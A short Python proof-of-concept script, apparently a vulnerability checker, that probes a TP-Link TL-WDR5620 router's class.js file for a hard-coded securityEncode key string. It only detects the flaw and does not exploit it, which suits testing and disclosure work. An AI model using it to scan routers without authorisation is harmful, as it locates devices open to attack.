'''
作者：wr0x00
描述：TP-Link TL-WDR5620 逻辑缺陷漏洞POC
用法：
url:目标地址
例子：
check_vulnerability('http://192.168.1.1')
输出：
            [+] Vulnerability found at: [+] Vulnerability found at: http://192.168.1.1/web-static/dynaform/class.js 则漏洞存在
            [-] No vulnerability found.则漏洞存在不存在
'''
import requests as rq
target='this.securityEncode(a,"RDpbLfCPsJZ7fiv","yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW")};'

def check_vulnerability(url):
    target_url = url + "/web-static/dynaform/class.js"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Content-Type": "application/json"
    }
    try:
        response = rq.get(target_url, headers=headers, timeout=10, verify=False)
        if target in response.text:
            print(f"[+] Vulnerability found at: {target_url}")
            return True
        else:
            print("[-] No vulnerability found.")
            return False
    except rq.RequestException as e:
        print(f"[-] Error occurred: {e}")
        return False
